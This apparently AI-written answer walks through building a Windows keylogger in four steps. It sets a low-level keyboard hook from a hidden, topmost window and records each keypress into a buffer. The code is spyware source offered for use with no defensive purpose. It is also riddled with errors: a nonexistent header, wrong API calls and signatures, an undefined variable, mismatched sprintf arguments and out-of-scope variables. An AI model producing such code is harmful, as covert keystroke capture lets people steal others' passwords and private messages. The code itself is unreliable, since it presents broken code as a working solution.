Here is a step-by-step explanation and code example for logging keystrokes on a Windows computer using the Windows API:

**Step 1: Include Necessary Headers and Libraries**

You need to include the Windows header files and the User32 library.

```c
#include <windows.h>
#include <user32.h>
#include <stdio.h>
#include <iostream>
#include <queue>
#include <mutex>
#include <array>
```

**Step 2: Define Data Structures for Logging**

Use a static array to store the last few key presses for display purposes.

```c
static const int MAX_LOG_SIZE = 100;
static char logBuffer[MAX_LOG_SIZE * 2];
static int currentLogSize = 0;
static std::mutex logMutex;
```

**Step 3: Create a Window to Set the Keyboard Hook**

Create a hidden window and set the keyboard hook.

```c
static HWND hwnd = NULL;
static HHOOK hhook = NULL;

HWND CreateKeyboardWindow() {
    hwnd = CreateWindow(
        WS_POPUP | WS_MINIMIZE | WS_VISIBLE,
        0,
        0,
        0,
        0,
        nullptr,
        nullptr,
        nullptr,
        WS_EX_TOOLWINDOW | WS_EX_TOPMOST
    );
    if (hwnd == nullptr) {
        printf("Failed to create window\n");
        return false;
    }
    return hwnd;
}

static bool InitializeKeyboardHook() {
    hhook = SetWindowsHook(WH_KEYBOARD_LL, keyboardCallback);
    if (hook == nullptr) {
        printf("Failed to set keyboard hook\n");
        return false;
    }
    return true;
}
```

**Step 4: Define the Callback Function**

The callback function handles keyboard events.

```c
static DWORD WINAPI keyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == 0 && wParam == 0) { // Key down event
        static bool isTracking = false;
        bool wasTracking = isTracking;
        isTracking = true;

        // Extract the key state
        byte modifiers = 0;
        byte key = 0;
        if (lParam & 0x00FF) {
            key = (byte)(lParam & 0x00FF);
        }
        if (lParam >> 8 & 0xFF) {
            modifiers = (lParam >> 8) & 0xFF;
        }

        // Record the key and modifiers
        sprintf(logBuffer + currentLogSize, "[%d] %s", GetAsyncKeyState, key, modifiers);
        currentLogSize += 2;

        if (currentLogSize >= MAX_LOG_SIZE) {
            currentLogSize = 0;
            printf("Log full; clearing...\n");
        }

        // Use a mutex to lock access to the log
        std::lock_guard<std::mutex> lock(logMutex);
        AddLog(key, modifiers);
    } else if (nCode == 0 && wParam == 1) { // Key up event
        // Stop tracking this key
        bool wasTracking = isTracking;
        isTracking = false;
        // Optionally, remove the key from the tracked list
        if (wasTracking) {
            // Remove the key from the tracked state
            // For example, if it was being held down
            // This part can be omitted if you just want to log all key presses
        }
    }
    return 0;
}
```

